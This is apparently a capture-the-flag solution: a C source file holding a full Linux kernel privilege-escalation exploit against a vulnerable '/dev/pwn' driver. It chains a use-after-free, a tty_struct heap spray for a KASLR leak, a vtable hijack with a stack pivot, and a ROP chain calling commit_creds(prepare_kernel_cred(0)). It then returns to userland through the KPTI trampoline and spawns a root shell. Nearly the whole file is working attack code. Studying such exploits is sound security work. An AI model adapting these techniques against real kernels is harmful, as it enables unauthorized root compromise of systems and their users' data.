#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <syscall.h>
#include <stdio.h>
#include <pty.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <unistd.h>
#include <sys/user.h>

// Pwn device functions
struct ioctl_param {
    uint64_t  vec_ct;
    struct iovec vecs[16];
    int ind;             
};

int pfd;

void bzero(void *data, uint64_t size) {
    while (size--) {
        ((char*)data)[size] = 0;
    }
}

void alloc(const void *data, uint64_t len) {
    struct ioctl_param pm = {
        .vec_ct = 1,
        .vecs = { 
            [0] = {(void*)data, len}
        }
    };
    
    ioctl(pfd, 6, &pm);
}

void edit(int ind, const void *data, uint64_t len) {
    struct ioctl_param pm = {
        .vec_ct = 1,
        .vecs = { 
            [0] = {(void*)data, len}
        },
        .ind = ind
    };
    
    ioctl(pfd, 666, &pm);
}

void dealloc(int ind) {
    ioctl(pfd, 6666, &ind);
}

void view(int ind, void *data, uint64_t len) {
    struct ioctl_param pm = {
        .vec_ct = 1,
        .vecs = { 
            [0] = {data, len}
        },
        .ind = ind
    };
    
    ioctl(pfd, 66, &pm);
}
// End pwn functions

// Kernel structs
struct trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    uint64_t  rsp;
    uint64_t  ss;
} __attribute__ (( packed )) tf; // Trap frame used for iretq when returning back to userland

#define KERNCALL __attribute__((regparm(3)))
typedef int KERNCALL (* commit_creds_t)(unsigned long cred);
typedef unsigned long KERNCALL (* prepare_kernel_cred_t)(unsigned long cred);

// https://github.com/torvalds/linux/blob/84df9525b0c27f3ebc2ebb1864fa62a97fdedb7d/include/linux/tty_driver.h
struct tty_operations {
    void (*pad[12])(); // lookup, install, remove, open, close, shutdown, cleanup, write, put_char, flush_chars, write_room, chars_in_buffer
    void (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); // offset 0x60
    // rest don't matter
};

// https://github.com/torvalds/linux/blob/84df9525b0c27f3ebc2ebb1864fa62a97fdedb7d/include/linux/tty.h
struct tty_struct {
    char pad[0x18]; // magic, kref, dev, driver
    struct tty_operations *ops; // offset 0x18
    // rest doesnt matter
};

// Payload stuff
char kernel_data[0x2e0];
struct tty_operations* old_vtable;

// Final payload as root
void shell() {
    puts("HACKED!!!!!!");
    
    // Restore old vtable to avoid kernel panic on exit
    struct tty_struct* tty = (struct tty_struct*) kernel_data;
    tty->ops = old_vtable;
    edit(0, kernel_data, sizeof(kernel_data));

    system("/bin/sh");
    // Cleanly exit. The kernel will panic if we try to run the exploit again however.
    exit(0);
}

// Fill in tf members so kernel knows where to return to
void prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.rsp -= 1024; // unused part of  stack
    tf.rsp  &= -0x10; // Align to avoid sse crash
    // Since we return directly to shell there isn't return address pushed to stack.
    // so we need to simulate that push to maintain alignment
    tf.rsp  -= 8;
}

int main() {
    prepare_tf();

    pfd = open("/dev/pwn", O_RDONLY);

    char cont[0x2e0] = {};
    memset(cont, 0x41, 0x2e0);
    // Allocate two things
    alloc(cont, 0x2e0);
    alloc(cont, 0x2e0);
    alloc(cont, 0x2e0);

    // Now do UAF with invalid pointer
    // Which will cause deallocation, but does not reset use bit
    edit(0, 0, 8);

    // Spray a bunch of tty_struct, hopefully one will land in our UAF'ed region
#define ALLOC_NUM (50)
    int m_fd[ALLOC_NUM] = {0};
    for (int i = 0; i < ALLOC_NUM; i++)
        m_fd[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    // Now hopefully we can read and write this struct using our view/edit funcs

    // Leak kaslr base from ptmx function pointer
    view(0, kernel_data, sizeof(kernel_data));
    struct tty_struct* tty = (struct tty_struct*) kernel_data;
    uintptr_t leak = tty->ops;
    printf("[+] Leak : %p\n", leak);
    uintptr_t text_base = leak - 0x10a3820;
    printf("[+] Kernel base @ %p\n", text_base);

    // We have a single shot in vtable and the value of rax will also be that gadget
    // so we mmap a chunk that our pivoted stack will land in
    uintptr_t xchg_eax_esp = text_base + 0x1ebb7; // xchg eax, rsp ; ret
    printf("[+] Single-shot @ %p\n", xchg_eax_esp);

    // Setup fake vtable
    struct tty_operations fake_vtable;
    memset(&fake_vtable, 0x41, sizeof(fake_vtable));
    fake_vtable.ioctl = xchg_eax_esp;
    old_vtable = tty->ops;
    tty->ops = &fake_vtable;
    // Write back corrupted struct
    edit(0, kernel_data, sizeof(kernel_data));

    // Allocate ropchain
    size_t pivot_stack_addr = (size_t)(xchg_eax_esp) & 0xffffffff; // Target rsp
    size_t mmap_target = pivot_stack_addr & PAGE_MASK; // Align to page boundary
    char* mmapped = mmap(mmap_target, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(mmapped, 0x41, 0x10000);
    if (mmapped != mmap_target || pivot_stack_addr != mmapped + (pivot_stack_addr & ~PAGE_MASK))
    {
        perror("mmap");
        exit(0);
    }

    // Collect gadgets
    uintptr_t pop_rdi_ret = text_base + 0x86800;
    commit_creds_t commit_creds = text_base + 0xb9a00;
    prepare_kernel_cred_t prepare_kernel_cred = text_base + 0xb9db0;
    uintptr_t pop_rsi_ret = text_base + 0x10e261;
    uintptr_t mov_rdi_rax_pop_rbp_ret = text_base + 0x4d74cc;
    /*
      "swapgs_restore_regs_and_return_to_usermode"
      https://elixir.bootlin.com/linux/v4.19.26/source/arch/x86/entry/entry_64.S#L674
      0xffffffff81c0098a:    mov    rdi,rsp
      0xffffffff81c0098d:    mov    rsp,QWORD PTR gs:0x5004
      0xffffffff81c00996:    push   QWORD PTR [rdi+0x30]
      0xffffffff81c00999:    push   QWORD PTR [rdi+0x28]
      0xffffffff81c0099c:    push   QWORD PTR [rdi+0x20]
      0xffffffff81c0099f:    push   QWORD PTR [rdi+0x18]
      0xffffffff81c009a2:    push   QWORD PTR [rdi+0x10]
      0xffffffff81c009a5:    push   QWORD PTR [rdi]
      0xffffffff81c009a7:    push   rax
      0xffffffff81c009a8:    xchg   ax,ax
      0xffffffff81c009aa:    mov    rdi,cr3
      0xffffffff81c009ad:    jmp    0xffffffff81c009e3
      ---
      0xffffffff81c009e3:    or     rdi,0x1000
      0xffffffff81c009ea:    mov    cr3,rdi
      0xffffffff81c009ed:    pop    rax
      0xffffffff81c009ee:    pop    rdi
      0xffffffff81c009ef:    swapgs 
      0xffffffff81c009f2:    nop    DWORD PTR [rax]
      0xffffffff81c009f5:    jmp    0xffffffff81c00a20
      ---
      0xffffffff81c00a20:    test   BYTE PTR [rsp+0x20],0x4 ; check cs cpl
      0xffffffff81c00a25:    jne    0xffffffff81c00a29 ; return to kernel, don't want this.
      0xffffffff81c00a27:    iretq ; return to userland
    */
    uintptr_t kpti_ret = text_base + 0xc0098a;
    printf("[+] KPTI exit trampoline @ %p\n", &kpti_ret);

    // Arrange the buffet
    size_t idx = 0;
    uintptr_t* ropchain = (void**) pivot_stack_addr;
    // Get root
    ropchain[idx++] = pop_rdi_ret;
    ropchain[idx++] = 0;
    ropchain[idx++] = prepare_kernel_cred;
    // commit_creds(prepare_kernel_cred(0))
    ropchain[idx++] = pop_rsi_ret;
    ropchain[idx++] = -1;
    ropchain[idx++] = mov_rdi_rax_pop_rbp_ret;
    ropchain[idx++] = 0x6969696969696969; // popped rbp
    ropchain[idx++] = commit_creds; 
    // Return to user
    ropchain[idx++] = kpti_ret;
    ropchain[idx++] = 0x6969696969696969; // popped user rdi
    ropchain[idx++] = 0x6969696969696969; // popped user rax
    memcpy(&ropchain[idx], &tf,sizeof(tf));

    puts("Ready to pwn! Strike return key to trigger");
    getchar();  

    for (int i = 0; i < ALLOC_NUM; i++)
        ioctl(m_fd[i], 0, 0);

    puts("Exploit failed");
    exit(0);
}
